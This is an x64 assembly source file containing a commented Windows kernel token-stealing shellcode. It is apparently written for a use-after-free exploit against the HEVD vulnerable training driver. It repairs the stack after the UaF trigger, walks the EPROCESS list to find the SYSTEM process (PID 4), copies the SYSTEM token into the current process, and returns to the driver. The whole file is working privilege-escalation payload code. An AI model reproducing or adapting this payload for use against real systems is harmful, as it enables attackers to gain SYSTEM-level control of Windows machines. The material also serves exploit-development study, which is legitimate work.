.CODE

Shellcode PROC
	; NOTE:							avoid changing non-volatile registers:
								; rbx, r12, r13, r14, r15

	recover_stack:						; recover the stack nice and early
										; we want to return to HEVD+0x85163
		mov rax, r11					; r11 (pre-UaF trigger) is rsp + 0x40
		mov rcx, 040h					;
		add rax, rcx					; rax now contains old stack value
		mov rcx, rax					; rcx now contains old stack value
		mov rsp, rcx					; reallign stack to previous value

	start:
		mov rax, gs:[0188h]				; get current thread (_KTHREAD)
		mov rax, [rax+0b8h]				; get current process (_KPROCESS)
		mov r8, rax					; store _EPROCESS in r8

	loop_start:
		mov r8, [r8+0448h]				; get ActiveProcessLinks
		sub r8, 0448h					; get current process (_EPROCESS)
		mov rcx, [r8+0440h]				; get UniqueProcessId (PID)
		cmp rcx, 04h					; compare PID to SYSTEM PID 
		jne loop_start					; loop until SYSTEM PID is found

	apply_token:
		mov rcx, [r8+04b8h]				; SYSTEM token is @ offset _EPROCESS + 0x4b8
		and cl, 0f0h					; clear out _EX_FAST_REF RefCnt
		mov [rax+04b8h], rcx				; copy SYSTEM token to current process

		xor eax, eax					; return 0
		ret						; ret back to driver code
Shellcode ENDP

END
